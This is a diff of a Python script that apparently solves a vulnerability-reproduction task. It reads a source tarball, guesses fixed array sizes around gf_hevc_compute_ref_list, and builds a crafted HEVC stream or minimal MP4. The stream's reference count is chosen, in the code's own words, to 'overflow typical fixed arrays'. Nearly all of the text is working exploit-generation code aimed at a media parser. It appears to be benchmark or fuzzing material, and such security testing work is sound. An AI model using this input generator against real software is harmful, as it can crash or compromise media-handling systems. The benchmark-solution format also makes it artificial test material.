-    # hvc1 sample entry (VideoSampleEntry)
-    compressorname = bytes([0]) + b"\x00" * 31
-    visual = (
-        b"\x00" * 6 + struct.pack(">H", 1) +  # reserved, data_reference_index
-        struct.pack(">H", 0) + struct.pack(">H", 0) +  # pre_defined, reserved
-        b"\x00" * 12 +  # pre_defined[3]
-        struct.pack(">H", 64) + struct.pack(">H", 64) +  # width, height
-        struct.pack(">I", 0x00480000) + struct.pack(">I", 0x00480000) +  # horiz/vert resolution
-        struct.pack(">I", 0) +  # reserved
-        struct.pack(">H", 1) +  # frame_count
-        compressorname +
-        struct.pack(">H", 0x0018) + struct.pack(">H", 0xFFFF)  # depth, pre_defined
-    )
-    hvc1 = _mp4_box(b"hvc1", visual + hvcc)
-
-    stsd = _mp4_fullbox(b"stsd", 0, 0, struct.pack(">I", 1) + hvc1)
-    stts = _mp4_fullbox(b"stts", 0, 0, struct.pack(">I", 1) + struct.pack(">II", 1, 1))
-    stsc = _mp4_fullbox(b"stsc", 0, 0, struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))
-    stsz = _mp4_fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 1) + struct.pack(">I", len(sample_payload)))
-    # stco placeholder, fill later
-    stco_placeholder = _mp4_fullbox(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", 0))
-
-    stbl = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)
-
-    url = _mp4_fullbox(b"url ", 0, 1, b"")
-    dref = _mp4_fullbox(b"dref", 0, 0, struct.pack(">I", 1) + url)
-    dinf = _mp4_box(b"dinf", dref)
-
-    vmhd = _mp4_fullbox(b"vmhd", 0, 1, struct.pack(">H", 0) + struct.pack(">HHH", 0, 0, 0))
-    minf = _mp4_box(b"minf", vmhd + dinf + stbl)
-
-    hdlr_name = b"VideoHandler\x00"
-    hdlr = _mp4_fullbox(b"hdlr", 0, 0, struct.pack(">I4s", 0, b"vide") + b"\x00" * 12 + hdlr_name)
-    mdhd = _mp4_fullbox(b"mdhd", 0, 0, struct.pack(">IIIIH2s", 0, 0, 1000, 1, 0, b"\x00\x00"))
-    mdia = _mp4_box(b"mdia", mdhd + hdlr + minf)
-
-    tkhd = _mp4_fullbox(
-        b"tkhd", 0, 0x0007,
-        struct.pack(">IIII", 0, 0, 1, 0) +  # creation, modification, track_id, reserved
-        struct.pack(">I", 1) + struct.pack(">I", 0) +  # duration, reserved
-        struct.pack(">II", 0, 0) +  # reserved
-        struct.pack(">hhhh", 0, 0, 0, 0) +  # layer, alt_group, volume, reserved
-        struct.pack(">9I",
-                    0x00010000, 0, 0,
-                    0, 0x00010000, 0,
-                    0, 0, 0x40000000) +  # matrix
-        struct.pack(">II", 64 << 16, 64 << 16)  # width,height in 16.16
-    )
-    trak = _mp4_box(b"trak", tkhd + mdia)
-
-    mvhd = _mp4_fullbox(
-        b"mvhd", 0, 0,
-        struct.pack(">IIII", 0, 0, 1000, 1) +  # creation, modification, timescale, duration
-        struct.pack(">I", 0x00010000) +  # rate 1.0
-        struct.pack(">H", 0x0100) + struct.pack(">H", 0) +  # volume 1.0, reserved
-        struct.pack(">II", 0, 0) +  # reserved
-        struct.pack(">9I",
-                    0x00010000, 0, 0,
-                    0, 0x00010000, 0,
-                    0, 0, 0x40000000) +  # matrix
-        struct.pack(">6I", 0, 0, 0, 0, 0, 0) +  # pre_defined
-        struct.pack(">I", 2)  # next_track_ID
-    )
-    moov = _mp4_box(b"moov", mvhd + trak)
-
-    mdat = _mp4_box(b"mdat", sample_payload)
-
-    # Patch stco offset to mdat payload start
-    prefix = ftyp + moov
-    mdat_header_len = 8
-    chunk_offset = len(prefix) + mdat_header_len
-    stco = _mp4_fullbox(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", chunk_offset))
-
-    # Rebuild moov with patched stco
-    stbl2 = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco)
-    minf2 = _mp4_box(b"minf", vmhd + dinf + stbl2)
-    mdia2 = _mp4_box(b"mdia", mdhd + hdlr + minf2)
-    trak2 = _mp4_box(b"trak", tkhd + mdia2)
-    moov2 = _mp4_box(b"moov", mvhd + trak2)
-
-    return ftyp + moov2 + mdat
-
-
-def _detect_preferred_format_from_tree(root: str) -> str:
-    # Returns: "mp4", "length", "annexb"
-    fuzz_files = []
-    for dirpath, dirnames, filenames in os.walk(root):
-        lp = dirpath.lower()
-        if ("fuzz" not in lp) and ("oss-fuzz" not in lp) and ("fuzzer" not in lp):
-            continue
-        for fn in filenames:
-            lfn = fn.lower()
-            if not lfn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
+    def maybe_update_limit_from_text(text: str) -> None:
+        nonlocal ref_limit_guess
+        # Find numeric bracket sizes in/near the compute function (stack arrays often have fixed sizes)
+        for m in re.finditer(r"\[\s*(\d{1,4})\s*\]", text):
+            try:
+                n = int(m.group(1))
+            except Exception:
                 continue
-            fuzz_files.append(os.path.join(dirpath, fn))
-            if len(fuzz_files) >= 200:
-                break
-        if len(fuzz_files) >= 200:
-            break
+            if 4 <= n <= 512:
+                if n > ref_limit_guess:
+                    ref_limit_guess = n
 
-    patterns = {
-        "mp4": re.compile(r"\bgf_isom_", re.IGNORECASE),
-        "annexb": re.compile(r"start[_ ]?code|annex\s*b|nalu_next_start_code|0x000001", re.IGNORECASE),
-        "length": re.compile(r"lengthsize|length_size|nal[_ ]?size|hvcc|hvcC|read_be32|read_u32", re.IGNORECASE),
-    }
+    try:
+        with tarfile.open(src_path, "r:*") as tf:
+            for mi in tf.getmembers():
+                name = mi.name
+                lname = name.lower()
+                if mi.size <= 0 or mi.size > 2_000_000:
+                    continue
+                if not (lname.endswith(".c") or lname.endswith(".h") or lname.endswith(".cpp") or lname.endswith(".cc")):
+                    continue
+                f = tf.extractfile(mi)
+                if not f:
+                    continue
+                try:
+                    data = f.read()
+                except Exception:
+                    continue
+                try:
+                    text = data.decode("utf-8", "ignore")
+                except Exception:
+                    text = data.decode("latin1", "ignore")
 
-    saw_fuzzer_entry = False
-    for fp in fuzz_files:
-        try:
-            st = os.stat(fp)
-            if st.st_size > 512 * 1024:
-                continue
-            with open(fp, "rb") as f:
-                data = f.read(512 * 1024)
-        except OSError:
-            continue
-        text = data.decode("utf-8", "ignore")
-        if "LLVMFuzzerTestOneInput" in text or "FuzzerTestOneInput" in text:
-            saw_fuzzer_entry = True
-            if patterns["mp4"].search(text):
-                return "mp4"
-            if patterns["annexb"].search(text) and not patterns["length"].search(text):
-                return "annexb"
-            if patterns["length"].search(text) and not patterns["annexb"].search(text):
-                return "length"
+                if not wants_mp4:
+                    if ("gf_isom_open" in text) or ("gf_isom_open_mem" in text) or ("isomedia" in text) or ("isobmff" in text):
+                        wants_mp4 = True
 
-    if saw_fuzzer_entry:
-        # If unsure but fuzzer found, prefer annexb (common)
-        return "annexb"
+                if func_buf is None and "gf_hevc_compute_ref_list" in text and "{" in text:
+                    # Try to capture around function body
+                    idx = text.find("gf_hevc_compute_ref_list")
+                    if idx != -1:
+                        snippet = text[idx: idx + 20000]
+                        if re.search(r"gf_hevc_compute_ref_list\s*\([^)]*\)\s*\{", snippet):
+                            func_buf = snippet
 
-    return "annexb"
+                if func_buf is not None and ref_limit_guess < 128:
+                    # also scan current file if it contains likely list sizes
+                    if "RefPicList" in text or "ref_list" in text or "refPicList" in text:
+                        maybe_update_limit_from_text(text)
+            if func_buf is not None:
+                maybe_update_limit_from_text(func_buf)
+    except Exception:
+        pass
+
+    # choose a safe but "large enough" active ref count to overflow typical fixed arrays
+    limit = ref_limit_guess
+    if limit < 16:
+        limit = 16
+    # ensure we exceed by a meaningful margin, but keep bounded
+    num_refs = max(64, min(256, limit + 17))
+    # return minus1 value
+    return wants_mp4, num_refs
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tmpdir = None
-        fmt = "annexb"
-        try:
-            tmpdir = tempfile.mkdtemp(prefix="src_")
-            try:
-                with tarfile.open(src_path, "r:*") as tf:
-                    tf.extractall(tmpdir)
-            except Exception:
-                tmpdir = None
+        wants_mp4, num_refs = scan_tar_for_hints(src_path)
+        num_ref_idx_l0_active_minus1 = max(0, num_refs - 1)
 
-            if tmpdir is not None:
-                fmt = _detect_preferred_format_from_tree(tmpdir)
+        vps = make_hevc_nal(32, build_vps_rbsp())
+        sps = make_hevc_nal(33, build_sps_rbsp())
+        pps = make_hevc_nal(34, build_pps_rbsp())
 
-        finally:
-            # No cleanup to avoid issues with read-only environments; temp dirs are small.
-            pass
+        aud_i = make_hevc_nal(35, build_aud_rbsp(0))
+        idr = make_hevc_nal(19, build_slice_rbsp_idr())
 
-        if fmt == "mp4":
-            vps = _nal_unit(32, _make_vps_rbsp())
-            sps = _nal_unit(33, _make_sps_rbsp())
-            pps = _nal_unit(34, _make_pps_rbsp())
-            idr = _nal_unit(19, _make_slice_rbsp(19, slice_type=2, poc_lsb=0, overflow_refs=False))
-            psl = _nal_unit(1, _make_slice_rbsp(1, slice_type=1, poc_lsb=1, overflow_refs=True))
-            return _build_minimal_mp4_with_hevc([idr, psl], vps, sps, pps)
+        aud_p = make_hevc_nal(35, build_aud_rbsp(1))
+        psl = make_hevc_nal(1, build_slice_rbsp_p(num_ref_idx_l0_active_minus1))
 
-        if fmt == "length":
-            return _build_length_prefixed_stream(length_size=4, include_param_sets=True)
+        if wants_mp4:
+            hvcc = build_hvcc(vps, sps, pps, length_size_minus_one=3)
+            sample1 = make_length_prefixed_sample([aud_i, idr])
+            sample2 = make_length_prefixed_sample([aud_p, psl])
+            return build_minimal_mp4_hevc([sample1, sample2], hvcc, width=16, height=16)
 
-        return _build_annexb_stream()
+        # Annex-B fallback
+        sc = b"\x00\x00\x00\x01"
+        return sc + vps + sc + sps + sc + pps + sc + aud_i + sc + idr + sc + aud_p + sc + psl
